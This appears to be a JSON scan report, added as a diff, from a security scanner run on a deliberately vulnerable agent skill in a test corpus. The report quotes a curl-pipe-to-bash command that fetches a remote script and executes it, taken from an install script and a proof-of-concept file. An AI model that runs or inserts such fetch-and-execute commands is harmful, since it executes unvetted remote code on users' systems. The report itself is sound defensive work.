@@ -1,0 +1,442 @@
+{
+  "target": "/Users/river/Projects/mcp-vulnlab/corpus/skills/skill-curl-bash",
+  "mode": "skill",
+  "scanner_count": 17,
+  "scanners": [
+    {
+      "name": "agent_skills",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 1,
+      "findings": [
+        {
+          "scanner": "agent_skills",
+          "severity": "medium",
+          "title": "Missing skill author in frontmatter (unattributed skill)",
+          "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+          "file": "SKILL.md",
+          "line": 1,
+          "snippet": "name: skill-curl-bash\ndescription: Installs and configures a set of command-line productivity tools. Use when the user a",
+          "category": "frontmatter",
+          "rule_id": "",
+          "confidence": 0.6,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "5df57f631575",
+          "needs_adjudication": true
+        }
+      ]
+    },
+    {
+      "name": "archive",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "bytecode",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "dataflow",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "dead_anchors",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "devcontainer",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "lifecycle",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "manifest_drift",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "mcp_security",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "oversize",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "provenance",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "runtime_dynamism",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "sast",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 2,
+      "findings": [
+        {
+          "scanner": "sast",
+          "severity": "critical",
+          "title": "Curl Pipe Bash",
+          "description": "Potential shell-injection vulnerability",
+          "file": "scripts/install.sh",
+          "line": 14,
+          "snippet": "curl -sSL \"$SETUP_URL\" | bash",
+          "category": "shell-injection",
+          "rule_id": "SA-SH-002",
+          "confidence": 0.8,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "3551d7ec6df3",
+          "needs_adjudication": true
+        },
+        {
+          "scanner": "sast",
+          "severity": "critical",
+          "title": "Pipe to Shell Interpreter",
+          "description": "Potential shell-injection vulnerability",
+          "file": "scripts/install.sh",
+          "line": 14,
+          "snippet": "curl -sSL \"$SETUP_URL\" | bash",
+          "category": "shell-injection",
+          "rule_id": "SA-SH-003",
+          "confidence": 0.8,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "8a72a1a9faa7",
+          "needs_adjudication": true
+        }
+      ]
+    },
+    {
+      "name": "secrets",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "skill_threats",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 2,
+      "findings": [
+        {
+          "scanner": "skill_threats",
+          "severity": "critical",
+          "title": "Pipe-to-shell download pattern",
+          "description": "Matched in prerequisite-attack scan",
+          "file": "exploits.json",
+          "line": 21,
+          "snippet": "\"poc\": \"curl -sSL \\\"${SETUP_URL:-https://setup.example.invalid/install.sh}\\\" | bash\"",
+          "category": "prerequisite-attack",
+          "rule_id": "ST-PR-001",
+          "confidence": 0.8,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "9252b4ac8acd",
+          "needs_adjudication": true
+        },
+        {
+          "scanner": "skill_threats",
+          "severity": "critical",
+          "title": "Pipe-to-shell download pattern",
+          "description": "Matched in prerequisite-attack scan",
+          "file": "exploits.json",
+          "line": 42,
+          "snippet": "\"config\": \"# Corrected: pinned artifact with a verified digest, installed from a trusted registry.\\ncurl -sSL \\\"https://",
+          "category": "prerequisite-attack",
+          "rule_id": "ST-PR-001",
+          "confidence": 0.8,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "ee4695973155",
+          "needs_adjudication": true
+        }
+      ]
+    },
+    {
+      "name": "splitstream",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "yara",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": [],
+      "stderr": "[!] scan_yara: yara-python not found; signature scan skipped (install yara-python to enable)"
+    }
+  ],
+  "summary": {
+    "critical": 4,
+    "high": 0,
+    "medium": 1,
+    "low": 0,
+    "total": 5
+  },
+  "verdicts": {
+    "block": 0,
+    "warn": 5,
+    "info": 0,
+    "suppressed": 0
+  },
+  "exit_code": 2,
+  "findings": [
+    {
+      "scanner": "sast",
+      "severity": "critical",
+      "title": "Curl Pipe Bash",
+      "description": "Potential shell-injection vulnerability",
+      "file": "scripts/install.sh",
+      "line": 14,
+      "snippet": "curl -sSL \"$SETUP_URL\" | bash",
+      "category": "shell-injection",
+      "rule_id": "SA-SH-002",
+      "confidence": 0.8,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "3551d7ec6df3",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "sast",
+      "severity": "critical",
+      "title": "Pipe to Shell Interpreter",
+      "description": "Potential shell-injection vulnerability",
+      "file": "scripts/install.sh",
+      "line": 14,
+      "snippet": "curl -sSL \"$SETUP_URL\" | bash",
+      "category": "shell-injection",
+      "rule_id": "SA-SH-003",
+      "confidence": 0.8,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "8a72a1a9faa7",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "skill_threats",
+      "severity": "critical",
+      "title": "Pipe-to-shell download pattern",
+      "description": "Matched in prerequisite-attack scan",
+      "file": "exploits.json",
+      "line": 21,
+      "snippet": "\"poc\": \"curl -sSL \\\"${SETUP_URL:-https://setup.example.invalid/install.sh}\\\" | bash\"",
+      "category": "prerequisite-attack",
+      "rule_id": "ST-PR-001",
+      "confidence": 0.8,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "9252b4ac8acd",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "skill_threats",
+      "severity": "critical",
+      "title": "Pipe-to-shell download pattern",
+      "description": "Matched in prerequisite-attack scan",
+      "file": "exploits.json",
+      "line": 42,
+      "snippet": "\"config\": \"# Corrected: pinned artifact with a verified digest, installed from a trusted registry.\\ncurl -sSL \\\"https://",
+      "category": "prerequisite-attack",
+      "rule_id": "ST-PR-001",
+      "confidence": 0.8,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "ee4695973155",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "agent_skills",
+      "severity": "medium",
+      "title": "Missing skill author in frontmatter (unattributed skill)",
+      "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+      "file": "SKILL.md",
+      "line": 1,
+      "snippet": "name: skill-curl-bash\ndescription: Installs and configures a set of command-line productivity tools. Use when the user a",
+      "category": "frontmatter",
+      "rule_id": "",
+      "confidence": 0.6,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "5df57f631575",
+      "needs_adjudication": true
+    }
+  ],
+  "suppressed": [],
+  "coverage_status": {
+    "overall": "COMPLETE",
+    "per_scanner": {
+      "agent_skills": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "archive": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "bytecode": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "dataflow": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "dead_anchors": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "devcontainer": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "lifecycle": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "manifest_drift": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "mcp_security": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "oversize": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "provenance": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "runtime_dynamism": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "sast": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "secrets": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "skill_threats": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "splitstream": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "yara": {
+        "status": "COMPLETE",
+        "reasons": []
+      }
+    },
+    "gaps": []
+  },
+  "core_verdict": {
+    "tier": "block",
+    "exit_code": 2,
+    "block": 0,
+    "warn": 5,
+    "info": 0,
+    "suppressed": 0,
+    "total": 5
+  },
+  "enrichment_status": {
+    "overall": "DEGRADED",
+    "vulns": "complete",
+    "rulepack_feed": "ok",
+    "dead_anchors": "complete",
+    "adjudication": "pending",
+    "adjudication_annotations": [],
+    "capability_gaps": [
+      {
+        "scanner": "yara",
+        "reason": "missing-tool",
+        "category": "capability"
+      }
+    ]
+  },
+  "capability_ledger": {
+    "declared": false,
+    "source": "",
+    "capabilities": [],
+    "annotations": [],
+    "error": null
+  }
+}
